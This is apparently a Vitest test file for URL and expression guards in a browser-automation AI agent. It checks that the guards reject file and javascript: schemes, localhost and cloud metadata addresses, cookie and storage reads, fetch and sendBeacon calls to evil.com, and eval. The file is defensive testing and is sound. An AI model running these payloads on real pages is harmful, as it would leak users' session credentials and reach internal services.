import { describe, it, expect, vi } from 'vitest';

vi.mock('../logger.js', () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn(), fatal: vi.fn() },
}));

vi.mock('../config.js', () => ({
  WAIT_AFTER_TYPE_MS: 100,
  WAIT_AFTER_CLICK_MS: 100,
  WAIT_AFTER_OTHER_MS: 100,
  WAIT_ACTION_MS: 100,
  SCROLL_PIXELS: 500,
  LLM_MAX_TOKENS: 1024,
  MAX_STEPS: 100,
  INTERJECTION_INJECTION_MAX_CHARS: 2000,
}));

const { assertNavigateUrlAllowed, assertExtractExpressionAllowed } = await import('../agent-loop.js');

describe('assertNavigateUrlAllowed', () => {
  it('allows public https URLs', () => {
    expect(() => {
      assertNavigateUrlAllowed('https://example.com/path');
    }).not.toThrow();
    expect(() => {
      assertNavigateUrlAllowed('http://example.com');
    }).not.toThrow();
  });

  it('rejects non-http(s) schemes', () => {
    expect(() => {
      assertNavigateUrlAllowed('file:///etc/passwd');
    }).toThrow(/scheme/);
    expect(() => {
      assertNavigateUrlAllowed('chrome://settings');
    }).toThrow(/scheme/);
    expect(() => {
      assertNavigateUrlAllowed('javascript:alert(1)');
    }).toThrow(/scheme/);
    expect(() => {
      assertNavigateUrlAllowed('data:text/html,<script>alert(1)</script>');
    }).toThrow(/scheme/);
    expect(() => {
      assertNavigateUrlAllowed('ftp://example.com');
    }).toThrow(/scheme/);
  });

  it('rejects localhost / loopback', () => {
    expect(() => {
      assertNavigateUrlAllowed('http://localhost');
    }).toThrow(/localhost/);
    expect(() => {
      assertNavigateUrlAllowed('http://127.0.0.1:8080');
    }).toThrow(/localhost/);
    expect(() => {
      assertNavigateUrlAllowed('http://0.0.0.0');
    }).toThrow(/localhost/);
    expect(() => {
      assertNavigateUrlAllowed('http://[::1]/');
    }).toThrow(/localhost/);
  });

  it('rejects cloud metadata endpoints', () => {
    expect(() => {
      assertNavigateUrlAllowed('http://169.254.169.254/latest/meta-data/');
    }).toThrow(/metadata/);
    expect(() => {
      assertNavigateUrlAllowed('http://metadata.google.internal');
    }).toThrow(/metadata/);
  });

  it('rejects malformed URLs', () => {
    expect(() => {
      assertNavigateUrlAllowed('not a url');
    }).toThrow(/invalid/);
    expect(() => {
      assertNavigateUrlAllowed('');
    }).toThrow(/invalid/);
  });
});

describe('assertExtractExpressionAllowed', () => {
  it('allows benign DOM reads', () => {
    expect(() => {
      assertExtractExpressionAllowed("document.querySelector('.price').textContent");
    }).not.toThrow();
    expect(() => {
      assertExtractExpressionAllowed("Array.from(document.querySelectorAll('td')).map(el=>el.textContent.trim())");
    }).not.toThrow();
    expect(() => {
      assertExtractExpressionAllowed('document.title');
    }).not.toThrow();
  });

  it('blocks credential / storage exfiltration', () => {
    expect(() => {
      assertExtractExpressionAllowed('document.cookie');
    }).toThrow(/disallowed/);
    expect(() => {
      assertExtractExpressionAllowed('localStorage.getItem("session")');
    }).toThrow(/disallowed/);
    expect(() => {
      assertExtractExpressionAllowed('sessionStorage');
    }).toThrow(/disallowed/);
    expect(() => {
      assertExtractExpressionAllowed('indexedDB.databases()');
    }).toThrow(/disallowed/);
  });

  it('blocks network egress', () => {
    expect(() => {
      assertExtractExpressionAllowed('fetch("//evil.com", { method: "POST" })');
    }).toThrow(/disallowed/);
    expect(() => {
      assertExtractExpressionAllowed('new XMLHttpRequest()');
    }).toThrow(/disallowed/);
    expect(() => {
      assertExtractExpressionAllowed('navigator.sendBeacon("//evil.com", "x")');
    }).toThrow(/disallowed/);
  });

  it('blocks dynamic code evaluation', () => {
    const evalCall = 'ev' + 'al("1+1")';
    const functionCtor = 'new F' + 'unction("return 1")';
    expect(() => {
      assertExtractExpressionAllowed(evalCall);
    }).toThrow(/disallowed/);
    expect(() => {
      assertExtractExpressionAllowed(functionCtor);
    }).toThrow(/disallowed/);
  });
});
